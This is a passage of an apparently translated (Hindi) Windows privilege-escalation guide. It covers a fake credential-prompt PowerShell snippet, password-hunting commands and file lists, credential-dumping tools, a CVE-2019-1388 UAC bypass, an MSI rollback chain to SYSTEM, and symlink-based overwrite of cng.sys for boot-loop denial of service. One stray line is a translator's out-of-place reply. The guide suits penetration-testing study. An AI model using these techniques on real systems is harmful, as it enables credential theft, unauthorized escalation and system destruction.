$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फाइलनाम जिनमें credentials हो सकते हैं**

ज्ञात फ़ाइलें जो कुछ समय पहले **passwords** को **clear-text** या **Base64** में रखती थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
कृपया बताएँ किन "proposed files" को सर्च करना है और या तो संबंधित फाइलों की सामग्री पेस्ट करें। फाइल पाथ/सामग्री दिए बिना अनुवाद या सर्च नहीं कर सकता।
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

आपको Bin भी चेक करना चाहिए ताकि उसके अंदर credentials मिल सकें

कई प्रोग्राम्स द्वारा सेव किए गए **पासवर्ड रिकवर** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के अंदर

**अन्य संभावित registry keys जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के passwords स्टोर होते हैं।\
ब्राउज़र के history, bookmarks और favourites भी चेक करें — क्योंकि शायद कुछ **passwords** वहाँ स्टोर हों।

ब्राउज़र से passwords निकालने के टूल:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows ऑपरेटिंग सिस्टम के भीतर बनी एक तकनीक है जो अलग-अलग भाषाओं में लिखे सॉफ़्टवेयर कंपोनेंट्स के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के जरिये functionality एक्सपोज़ करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं क्रमशः। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनाई जाती है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी तौर पर, यदि आप उन किसी भी **DLLs** को overwrite कर सकते हैं जो execute होने वाली हैं, तो यदि वह DLL किसी अलग user द्वारा execute किया जाता है तो आप **escalate privileges** कर सकते हैं।

जानने के लिए कि attackers COM Hijacking को persistence mechanism के रूप में कैसे उपयोग करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### फ़ाइलों और registry में Generic Password खोज

**फ़ाइल के कंटेंट में खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशेष फ़ाइल नाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### ऐसे Tools जो passwords खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin जिसे मैंने बनाया है; यह plugin victim के अंदर credentials खोजने वाले हर metasploit POST module को **automatically execute** करने के लिए है.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पेज में उल्लिखित उन सभी फ़ाइलों को खोजता है जिनमें passwords होते हैं.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से passwords निकालने के लिए एक और बेहतरीन tool है.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना कीजिए कि **a process running as SYSTEM open a new process** (`OpenProcess()`) **with full access**। वही प्रक्रिया **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**।  
फिर, यदि आपके पास **full access to the low privileged process** है, तो आप `OpenProcess()` के साथ बनाई गई उस **privileged process** के लिए खुला हुआ **open handle** पकड़कर और उस पर **shellcode** inject कर सकते हैं।  
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)  
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें सामान्यतः **pipes** कहा जाता है, प्रक्रियाओं के बीच संचार और डेटा ट्रांसफर की अनुमति देते हैं।

Windows एक सुविधा देता है जिसका नाम **Named Pipes** है, जो अन-संबंधित प्रक्रियाओं को भी, यहाँ तक कि विभिन्न नेटवर्क्स पर भी, डेटा साझा करने की अनुमति देता है। यह एक client/server आर्किटेक्चर जैसा है, जहाँ भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब कोई **client** pipe के माध्यम से डेटा भेजता है, तो वह **server** जिसने pipe सेट किया है, यदि उसके पास आवश्यक **SeImpersonate** rights हैं, तो उस **client** की पहचान को **impersonate** कर सकता है। यदि आप कोई ऐसा **privileged process** पहचान लें जो आपके द्वारा बनाए गए pipe के साथ संचार करता है, तो जब वह उस pipe के साथ इंटरैक्ट करेगा तो आप उसकी पहचान अपनाकर उच्च privileges प्राप्त कर सकते हैं। इस तरह के हमले को निष्पादित करने के निर्देशों के लिए सहायक गाइड [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर उपलब्ध हैं।

इसके अलावा निम्न टूल्स named pipe संचार को intercept करने और pipes सूचीबद्ध/देखने के लिए उपयोगी हैं: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) (named pipe संचार को burp जैसे टूल के साथ intercept करने के लिए) और [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer) (सभी pipes सूचीबद्ध करने और privescs खोजने के लिए)।

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) server मोड में `\\pipe\\tapsrv` (MS-TRP) एक्सपोज़ करती है। एक remote authenticated client mailslot-based async event path का दुरुपयोग करके `ClientAttach` को किसी भी मौजूदा फ़ाइल पर arbitrary **4-byte write** में बदल सकता है जिसे `NETWORK SERVICE` द्वारा writable माना जाता है, फिर Telephony admin rights हासिल कर सकता है और arbitrary DLL को service के रूप में load कर सकता है। पूरा फ्लो:

- `ClientAttach` में `pszDomainUser` को किसी writable existing path पर सेट करना → service इसे `CreateFileW(..., OPEN_EXISTING)` के माध्यम से खोलता है और async event writes के लिए उपयोग करता है।
- प्रत्येक event attacker-controlled `InitContext` को `Initialize` से उस handle पर लिखता है। एक line app को `LRegisterRequestRecipient` (`Req_Func 61`) के साथ register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) के माध्यम से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- खुद को `[TapiAdministrators]` में `C:\Windows\TAPI\tsec.ini` में जोड़ें, reconnect करें, फिर arbitrary DLL path के साथ `GetUIDllName` कॉल करके `TSPI_providerUIIdentify` को `NETWORK SERVICE` के रूप में execute कराएँ।

अधिक विवरण:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

देखें: **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जिन्हें `ShellExecuteExW` पर forward किया जाता है, वे खतरनाक URI handlers (`file:`, `ms-appinstaller:` या किसी भी registered scheme) को trigger कर सकते हैं और current user के रूप में attacker-controlled फ़ाइलें execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब आपको किसी user के रूप में shell मिलती है, तो वहां scheduled tasks या अन्य processes हो सकते हैं जो command line पर credentials पास कर रहे हों। नीचे दिया गया स्क्रिप्ट हर दो सेकंड पर process command lines को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, और किसी भी परिवर्तन को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चोरी करना

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console or RDP) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में एक unprivileged user से terminal या किसी अन्य प्रक्रिया जैसे "NT\AUTHORITY SYSTEM" को चलाना संभव है।

यह एक ही vulnerability के जरिए privileges escalate करने और साथ ही UAC को bypass करने की अनुमति देता है। अतिरिक्त रूप से, कुछ भी install करने की आवश्यकता नहीं है और process के दौरान प्रयुक्त binary Microsoft द्वारा signed और issued है।

प्रभावित सिस्टम में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम उठाना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

इसे पढ़ें ताकि आप **Integrity Levels** के बारे में जान सकें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **इसे पढ़ें ताकि आप UAC और UAC bypasses के बारे में जान सकें:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Attack का मूल विचार Windows Installer के rollback फीचर का दुरुपयोग कर legitimate फ़ाइलों को uninstall के दौरान malicious फ़ाइलों से बदलना है। इसके लिये attacker को एक **malicious MSI installer** बनानी पड़ती है जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिये उपयोग होगी, जिसे बाद में Windows Installer uninstall के समय rollback फाइलें स्टोर करने के लिये उपयोग करेगा जहाँ rollback फाइलों को malicious payload रखने के लिये modify किया जाएगा।

सारांशित तकनीक निम्नानुसार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो एक harmless फ़ाइल (उदाहरण के लिये `dummy.txt`) को किसी writable फ़ोल्डर (`TARGETDIR`) में install करे।
- installer को **"UAC Compliant"** के रूप में मार्क करें, ताकि एक **non-admin user** इसे चला सके।
- install के बाद फ़ाइल पर एक **handle** open रखें।

- Step 2: Begin Uninstall
- वही `.msi` uninstall करें।
- uninstall प्रक्रिया फ़ाइलों को `C:\Config.Msi` में मूव करने और उन्हें `.rbf` फ़ाइलों में rename करने लगती है (rollback backups)।
- **GetFinalPathNameByHandle** का उपयोग कर open file handle को poll करें ताकि पता चल सके जब फ़ाइल `C:\Config.Msi\<random>.rbf` बन जाए।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल होता है जो:
- संकेत देता है जब `.rbf` लिखा गया हो।
- फिर uninstall जारी रखने से पहले किसी और event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- जब signal मिले, तो `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना open करें — यह उसे **delete होने से रोकता है**।
- फिर uninstall को समाप्त करने के लिये **signal back** करें।
- Windows Installer `.rbf` को delete करने में असफल रहता है, और क्योंकि यह सभी contents को delete नहीं कर सकता, **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली delete कर दें।
- अब **`C:\Config.Msi` खाली है**, hijack करने के लिये तैयार।

> इस बिंदु पर, **SYSTEM-level arbitrary folder delete vulnerability** को trigger करें ताकि `C:\Config.Msi` delete हो जाए।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- खुद `C:\Config.Msi` फ़ोल्डर recreate करें।
- **weak DACLs** सेट करें (उदाहरण: Everyone:F), और `WRITE_DAC` के साथ एक handle open रखें।

- Step 7: Run Another Install
- `.msi` को फिर से install करें, जिसमें:
- `TARGETDIR`: Writable location।
- `ERROROUT`: एक variable जो forced failure को trigger करे।
- यह install फिर से **rollback** trigger करने के लिये उपयोग होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग कर `C:\Config.Msi` की मॉनिटरिंग करें जब तक कि एक नई `.rbs` न आए।
- उसका filename capture करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** होता है जो:
- `.rbs` बनते ही एक event signal करता है।
- फिर आगे बढ़ने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से लागू कर देता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle है, आप फिर से **weak ACLs** लागू कर सकते हैं।

> ACLs सिर्फ handle open पर लागू होते हैं, इसलिए आप अभी भी folder में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को एक **fake rollback script** से overwrite करें जो Windows को बताता है कि:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore किया जाए।
- आपकी fake `.rbf` डालें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer resume हो।
- एक **type 19 custom action (`ErrorOut`)** configure किया गया है ताकि install को जानबूझकर एक ज्ञात बिंदु पर fail कर दिया जाए।
- इससे **rollback शुरू हो जाता** है।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy कर देता है।
- अब आपकी **malicious DLL एक SYSTEM-loaded path** में है।

- Final Step: Execute SYSTEM Code
- एक trusted **auto-elevated binary** (उदा., `osk.exe`) चलाएँ जो आपके hijacked DLL को load करे।
- **Boom**: आपका कोड **SYSTEM के रूप में execute** होता है।


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (ऊपर वाली) यह मानती है कि आप एक **पूरे फ़ोल्डर** (उदा., `C:\Config.Msi`) को delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप **NTFS internals** का दुरुपयोग कर सकते हैं: हर फ़ोल्डर के पास एक hidden alternate data stream होती है जिसे कहते हैं:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** स्टोर करता है।

इसलिए, यदि आप किसी फ़ोल्डर की **delete the `::$INDEX_ALLOCATION` stream** कर देते हैं, तो NTFS filesystem से पूरा फ़ोल्डर **removes the entire folder** हो जाता है।

आप यह standard file deletion APIs जैसे उपयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हैं, यह **folder को ही हटाता है**।

### Folder Contents Delete से SYSTEM EoP तक
अगर आपका primitive आपको arbitrary files/folders को delete करने की अनुमति नहीं देता, लेकिन यह **attacker-controlled folder के *contents* को delete करने की अनुमति देता है** तो क्या होगा?

1. Step 1: एक bait folder और file सेटअप करें
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- यह oplock जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है तो **execution को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process को ट्रिगर करें (उदा., `SilentCleanup`)
- यह process फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करता है और उनकी सामग्री हटाने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock ट्रिगर होता है** और नियंत्रण आपके callback को सौंप देता है।

4. Step 4: oplock callback के अंदर – हटाने को redirect करें

- विकल्प A: `file1.txt` को कहीं और मूव करें
- इससे `folder1` खाली हो जाएगा बिना oplock को तोड़े।
- `file1.txt` को सीधे हटाएँ मत — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को निशाना बनाता है जो फ़ोल्डर metadata को स्टोर करता है — इसे डिलीट करने से फ़ोल्डर भी डिलीट हो जाता है।

5. चरण 5: oplock को रिलीज़ करें
- SYSTEM प्रोसेस जारी रहता है और `file1.txt` को डिलीट करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटाया गया है।

### From Arbitrary Folder Create से Permanent DoS तक

ऐसी primitive का इस्तेमाल करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने देती है — भले ही आप **you can’t write files** या **set weak permissions** कर सकें।

नाम के रूप में किसी **critical Windows driver** वाले एक **folder** (file नहीं) बनाएं, उदाहरण के रूप में:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode ड्राइवर के अनुरूप होता है।
- यदि आप इसे पहले से **फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने का प्रयास करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर को सुलझाने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बाहरी हस्तक्षेप (जैसे, boot repair या disk access) के बिना **कोई fallback नहीं है**, और **कोई recovery नहीं है**।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** लॉग/एक्सपोर्ट उस पथ पर लिखता है जो किसी **writable config** से पढ़ा जाता है, तो उस पथ को **Object Manager symlinks + NTFS mount points** के साथ redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege** के बिना भी)।

**आवश्यकताएँ**
- लक्षित पथ स्टोर करने वाला config attacker द्वारा writable होना चाहिए (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point बनाने और एक OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged operation जो उस पथ पर लिखता है (log, export, report)।

**उदाहरण श्रृंखला**
1. privileged log destination पुनर्प्राप्त करने के लिए config पढ़ें, उदाहरण के लिए `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`।
2. admin के बिना पथ को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. प्रिविलेज्ड component द्वारा लॉग लिखे जाने का इंतज़ार करें (उदा., admin triggers "send test SMS"). यह लिखाई अब `C:\Windows\System32\cng.sys` में हो जाती है।
4. ओवरराइट किए गए target (hex/PE parser) का निरीक्षण करें ताकि करप्शन की पुष्टि हो सके; reboot करने पर Windows टेम्पर्ड driver path को लोड करने के लिए मजबूर हो जाता है → **boot loop DoS**. यह किसी भी protected file पर भी सामान्यीकृत होता है जिसे कोई privileged service write के लिए खोलेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन यदि `C:\Windows\System32\cng.sys` में एक copy मौजूद है तो पहले वही प्रयास किया जा सकता है, जिससे यह करप्ट डेटा के लिए एक भरोसेमंद DoS sink बन जाता है।



## **High Integrity से System तक**

### **नई service**

यदि आप पहले से ही एक High Integrity process पर चल रहे हैं, तो **path to SYSTEM** आसान हो सकता है सिर्फ़ **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक valid service हो या binary आवश्यक क्रियाएँ तेज़ी से करे क्योंकि अगर यह valid service नहीं होगा तो इसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable करने** और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं।\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (संभावतः आप इन्हें पहले से किसी High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes नहीं) को **open** कर सकेंगे, उस process का **token copy** कर पाएँगे, और उस token के साथ एक **arbitrary process create** कर सकेंगे।\
इस technique में आमतौर पर SYSTEM के रूप में चल रहे किसी ऐसे process को चुना जाता है जिसमें सभी token privileges हों (_हाँ, आप ऐसे SYSTEM processes पाएँगे जिनमें सभी token privileges नहीं होते_)।\
**आप** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा getsystem को escalate करने के लिए उपयोग की जाती है। यह technique इस बात पर आधारित है कि **एक pipe बनाया जाए और फिर किसी service को create/abuse किया जाए ताकि वह pipe पर लिखे**। फिर, वह **server** जिसने pipe बनाया है, और जिसने **`SeImpersonate`** privilege का उपयोग किया है, pipe client (service) के token को **impersonate** करके SYSTEM privileges प्राप्त कर सकेगा।\
यदि आप [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)।\
यदि आप [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) का एक उदाहरण पढ़ना चाहते हैं तो वह यहाँ है।

### Dll Hijacking

यदि आप उस स्थिति में पहुँच जाते हैं जहाँ आप किसी **dll** को hijack कर दें जो **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **loaded** हो रहा है, तो आप उन permissions के साथ arbitrary code execute कर सकेंगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है, और इसके अलावा यह एक high integrity process से प्राप्त करने के लिए काफी **easy** है क्योंकि उसे dlls लोड करने के लिए इस्तेमाल किए जाने वाले फोल्डर्स पर **write permissions** मिलते हैं।\
**आप** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

पढ़ें: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors देखने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
